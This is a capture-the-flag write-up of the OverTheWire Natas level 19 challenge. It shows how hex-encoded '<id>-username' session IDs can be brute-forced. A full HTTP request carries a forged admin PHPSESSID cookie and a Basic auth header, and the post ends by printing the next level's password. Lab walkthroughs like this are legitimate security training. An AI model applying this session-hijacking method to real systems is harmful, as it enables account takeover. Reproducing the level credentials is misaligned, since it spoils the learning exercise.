Similar to the previous level, but now it says that session IDs are not sequential.

I created a few sessions, with username "foo", and got the following IDs:
```
3530342d666f6f
34362d666f6f
32322d666f6f
```

Which turns out to be the hexadecimal encoding for the strings:
```
504-foo
46-foo
22-foo
```

So my guess is that session ID are still based on a random value between 1 and 640, but then includes some more processing. So same idea as the previous level, we can brute force the session ID for the admin user by generating strings like `<id>-admin`, converting it to its hexadecimal encoding, then sending it in a GET request Cookie header:
```
GET /index.php HTTP/1.1
Host: natas19.natas.labs.overthewire.org
Authorization: Basic bmF0YXMxOTo4TE1KRWhLRmJNS0lMMm14UUtqdjBhRURkazd6cFQwcw==
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=3238312d61646d696e
Connection: close
```

Password for the next level is `p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw`.
